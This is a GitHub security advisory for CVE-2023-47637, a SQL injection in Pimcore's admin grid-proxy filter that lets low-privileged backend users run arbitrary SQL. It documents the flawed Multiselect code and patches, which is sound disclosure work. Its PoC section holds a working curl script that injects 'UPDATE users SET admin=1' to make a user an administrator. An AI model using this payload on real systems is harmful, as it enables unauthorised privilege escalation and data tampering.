# [H] Pimcore SQL Injection in Admin Grid Filter API through Multiselect::getFilterConditionExt()

## Summary
Severity: High
Advisory: GHSA-72hh-xf79-429p
CVE: CVE-2023-47637
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-11-15
Source: https://github.com/advisories/GHSA-72hh-xf79-429p
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=0 <11.1.1

## Details
### Summary

User input passed directly into an SQL statement allows (non-admin) backend users to execute arbitrary SQL statements.

### Details

The `/admin/object/grid-proxy` endpoint calls `getFilterCondition()` on fields of classes to be filtered for at https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311, passing input from the request, and later executes the returned SQL.
One implementation of `getFilterCondition()` is in `Multiselect`, which does not normalize/escape/validate the passed value: https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312

### PoC

* Set up an example project as described on https://pimcore.com/docs/platform/Pimcore/Getting_Started/Installation/Docker_Based_Installation (demo package with example content)
* Enter the backend and add a new user without admin privileges, but the "Objects" permission enabled.
* Log out and back in with the new user. Grab the `X-pimcore-csrf-token` header from any request the backend does, as well as the `PHPSESSID` cookie.
* Run the following script, substituting the values accordingly:
    ```bash
    #!/bin/bash
    BASE_URL=http://localhost:8084 # REPLACE THIS!
    CSRF_TOKEN="bd89fd7ceb3b541dd63c200fd4fc8c8ea3cc1a05" # REPLACE THIS!
    COOKIE="PHPSESSID=a0f408f9af7657430a4e6a1608c80277" # REPLACE THIS!
    SQL="UPDATE users SET admin=1"
    
    FILTER_JSON="[{\"property\":\"tags\",\"operator\":\"=\",\"type\":\"list\",\"value\":[\"')); ${SQL}; --\"]}]"
    
    curl "${BASE_URL}/admin/object/grid-proxy?classId=EV&folderId=1119" \
	    -X POST \
	    -H "X-pimcore-csrf-token: ${CSRF_TOKEN}" \
	    -H "Cookie: ${COOKIE}" \
	    --data "filter=$FILTER_JSON"
    ```
* Refresh the backend, the user is admin now.

**Notes**
The above process also works with the initial admin user, but for demonstration purposes it is more interesting to use an unpriveleged one.
Other important variables to adjust in the above script for other deployments are the `classId=EV&folderId=1119` parameters, which must reference an existing class and folder, as well as `"property":"tags"`, which points to a Multiselect field in this class.

### Impact

Any backend user with very basic permissions can execute arbitrary SQL statements and thus alter any data or escalate their privileges to at least admin level.

### Patches
Apply [patch](https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch) manually.


### Workarounds
Update to version 11.1.1 or apply this [patch](https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch) manually.

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-72hh-xf79-429p
- https://nvd.nist.gov/vuln/detail/CVE-2023-47637
- https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0
- https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312
